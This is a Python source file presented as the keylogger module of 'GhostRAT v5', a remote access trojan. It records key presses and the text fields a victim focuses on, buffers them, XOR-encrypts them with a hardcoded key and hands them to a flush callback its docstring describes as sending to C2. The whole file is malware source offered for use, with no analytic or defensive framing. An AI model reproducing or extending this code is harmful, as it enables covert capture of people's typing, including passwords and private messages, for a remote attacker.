"""
GhostRAT v5 — Keylogger Module (Python)

Captures keyboard events and encodes them for C2 delivery.
"""

import time
import threading
from typing import List, Dict, Any, Optional, Callable


class Keylogger:
    """Keyboard capture module."""

    KEY_MAP = {
        'Enter': 0x01, 'Backspace': 0x02, 'Tab': 0x03, 'Escape': 0x04,
        'Delete': 0x05, 'ArrowUp': 0x06, 'ArrowDown': 0x07, 'ArrowLeft': 0x08,
        'ArrowRight': 0x09, 'Home': 0x0A, 'End': 0x0B, 'PageUp': 0x0C,
        'PageDown': 0x0D, 'Insert': 0x0E, 'CapsLock': 0x1C,
        'F1': 0x10, 'F2': 0x11, 'F3': 0x12, 'F4': 0x13, 'F5': 0x14,
        'F6': 0x15, 'F7': 0x16, 'F8': 0x17, 'F9': 0x18, 'F10': 0x19,
        'F11': 0x1A, 'F12': 0x1B
    }

    def __init__(self, crypto_key: str = "GHOSTRATV5", max_buffer_size: int = 256, flush_interval: int = 5000):
        self.crypto_key = crypto_key
        self.max_buffer_size = max_buffer_size
        self.flush_interval = flush_interval
        self.is_capturing = False
        self.key_buffer: List[int] = []
        self.key_presses: List[Dict[str, Any]] = []
        self.text_inputs: List[Dict[str, Any]] = []
        self.capture_start_time: Optional[float] = None
        self.on_flush: Optional[Callable] = None
        self._flush_timer: Optional[threading.Timer] = None

    def start(self) -> None:
        """Start keylogging."""
        if self.is_capturing:
            return
        self.is_capturing = True
        self.capture_start_time = time.time()
        self._start_flush_timer()

    def stop(self) -> None:
        """Stop keylogging."""
        self.is_capturing = False
        self._stop_flush_timer()
        self.flush_buffer()

    def _start_flush_timer(self) -> None:
        """Start periodic flush timer."""
        def flush():
            self.flush_buffer()
            if self.is_capturing:
                self._start_flush_timer()
        self._flush_timer = threading.Timer(self.flush_interval / 1000.0, flush)
        self._flush_timer.daemon = True
        self._flush_timer.start()

    def _stop_flush_timer(self) -> None:
        """Stop flush timer."""
        if self._flush_timer:
            self._flush_timer.cancel()
            self._flush_timer = None

    def record_key(self, key: str, code: str = "", key_code: int = 0) -> None:
        """Record a key press."""
        if not self.is_capturing:
            return

        self.key_presses.append({
            'key': key,
            'code': code,
            'keyCode': key_code,
            'timeStamp': time.time()
        })

        encoded = self._encode_key(key)
        self.key_buffer.extend(encoded)

        if len(self.key_buffer) >= self.max_buffer_size:
            self.flush_buffer()

    def _encode_key(self, key: str) -> List[int]:
        """Encode key to byte array."""
        if key in self.KEY_MAP:
            return [0x80, self.KEY_MAP[key]]
        char_code = ord(key) if len(key) == 1 else 0
        return [char_code] if char_code else []

    def flush_buffer(self) -> None:
        """Flush key buffer and send to C2."""
        if not self.key_buffer:
            return

        keys = self.key_buffer[:]
        self.key_buffer.clear()
        key_data = bytes(keys)

        # XOR encrypt
        encrypted = self._xor_encrypt(key_data, self.crypto_key)

        if self.on_flush:
            self.on_flush({
                'keys': encrypted,
                'keyCount': len(keys),
                'textInputs': self.text_inputs[:],
                'captureDuration': int((time.time() - self.capture_start_time) * 1000) if self.capture_start_time else 0
            })

        self.text_inputs.clear()

    def record_input_focus(self, input_type: str = 'text', input_id: str = '', input_name: str = '', placeholder: str = '') -> None:
        """Record focus on a text input."""
        if not self.is_capturing:
            return
        self.text_inputs.append({
            'type': input_type,
            'id': input_id,
            'name': input_name,
            'placeholder': placeholder,
            'timestamp': time.time()
        })
        if len(self.text_inputs) > 100:
            self.text_inputs.pop(0)

    def _xor_encrypt(self, data: bytes, key: str) -> bytes:
        """XOR encrypt data."""
        key_bytes = key.encode('utf-8')
        return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))

    def get_stats(self) -> Dict[str, Any]:
        """Get keylogger statistics."""
        return {
            'keysCaptured': len(self.key_presses),
            'bufferLength': len(self.key_buffer),
            'captureDuration': int((time.time() - self.capture_start_time) * 1000) if self.capture_start_time else 0,
            'isCapturing': self.is_capturing
        }
